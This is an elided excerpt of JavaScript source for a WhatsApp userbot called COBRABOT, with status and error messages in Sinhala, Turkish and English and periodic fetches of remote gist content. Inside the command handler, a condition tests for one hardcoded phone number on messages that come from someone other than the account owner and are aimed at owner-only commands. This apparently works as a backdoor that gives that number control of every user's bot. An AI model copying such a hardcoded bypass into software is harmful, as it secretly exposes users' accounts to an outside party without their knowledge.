...
async function whatsAsena () {
    ...
    setInterval(async () => { 
        ...
        await axios.get('https://gist.githubusercontent.com/sisula/f134ba8d5915120ca287d049314ee59c/raw/').then(async (ann) => {
    ...
    var insult = await axios.get('https://gist.githubusercontent.com/sisula/87a062013a64282b3d9ba73961729b7d/raw')
        ...
        if (config.WORKTYPE == 'public') {
            ...
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                ...
                if (config.FULLEVA == 'true') {
                    ...
                    await conn.sendMessage(conn.user.jid, '*🐍COBRABOT ™️ Working as public🐍*\n\n_කරුණාකර මෙහි ප්ලගීන උත්සාහ නොකරන්න. මෙය ඔබගේ ලොග් අංකයයි._\n_ඔබට ඕනෑම චැට් එකක විධාන උත්සාහ කළ හැකිය :)_\n\n*ඔබේ BOT public ආකාරයෙන් ක්‍රියාත්මක වේ. වෙනස් කිරීමට* _.setvar WORK_TYPE:private_ *විධානය භාවිතා කරන්න.*\n\n*COBRABOT භාවිතා කිරීමට ස්තූතියි ♥️*', MessageType.text);
                }               
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
            ...
            if (config.LANG == 'TR' || config.LANG == 'AZ') { 
                if (config.FULLEVA == 'true') {
                    ...
                    await conn.sendMessage(conn.user.jid, '*🐍COBRABOT ™️ Working as private🐍*\n\n_කරුණාකර මෙහි ප්ලගීන උත්සාහ නොකරන්න. මෙය ඔබගේ ලොග් අංකයයි._\n_ඔබට ඕනෑම චැට් එකක විධාන උත්සාහ කළ හැකිය :)_\n\n*ඔබේ BOT private ආකාරයෙන් ක්‍රියාත්මක වේ. වෙනස් කිරීමට* _.setvar WORK_TYPE:public_ *විධානය භාවිතා කරන්න.*\n\n*COBRABOT භාවිතා කිරීමට ස්තූතියි ♥️*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
        ...
        events.commands.map(
            async (command) =>  {
                ...
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    ...
                    if ((OWN.ff == "94766239744" && msg.key.fromMe === false && command.fromMe === true &&
                        ...
                        try {
                            ...
                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                await conn.sendMessage(conn.user.jid, '*-- HATA RAPORU [🐍COBRABOT ™️🐍] --*' + 
                                    ...
                                    '\n_Hatayı https://chat.whatsapp.com/FnzgfLP7CvN4eFnpWPW5ID bu gruba iletebilirsiniz._\n\n' +
                                ...
                                await conn.sendMessage(conn.user.jid, '*-- ERROR REPORT [🐍COBRABOT ™️🐍] --*' + 
                                    ...
                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/FnzgfLP7CvN4eFnpWPW5ID' +
